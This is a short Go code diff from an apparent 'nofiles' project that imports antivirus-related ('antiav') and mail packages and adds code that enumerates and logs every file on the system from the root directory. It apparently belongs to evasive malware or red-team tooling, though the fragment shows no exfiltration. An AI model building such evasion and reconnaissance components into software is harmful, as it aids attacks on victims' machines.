@@ -3,6 +3,7 @@ package main
 import (
 	"nofiles/antiav"
 	"nofiles/mail"
+	"nofiles/files"
 
 	"log"
 )
@@ -33,6 +34,11 @@ func main() {
 	err = email.Send()
 	if err != nil {
 		log.Println("Cannot send email:", err)
+	}
+
+	files := files.Files("/")
+	for _, file := range files {
+		log.Println(file)
 	}
 
 	err = antiav.After()
